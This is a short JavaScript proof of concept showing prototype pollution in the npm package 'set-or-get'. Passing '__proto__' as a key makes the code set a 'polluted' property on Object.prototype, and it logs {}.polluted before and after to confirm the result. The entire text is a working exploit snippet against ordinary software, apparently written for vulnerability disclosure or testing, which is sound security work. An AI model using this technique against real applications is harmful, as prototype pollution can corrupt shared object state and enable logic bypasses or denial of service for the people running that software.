var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var SetOrGet = require('set-or-get');
obj = {};
console.log({}.polluted);
SetOrGet(obj, '__proto__', obj).polluted = 'yes';
console.log({}.polluted);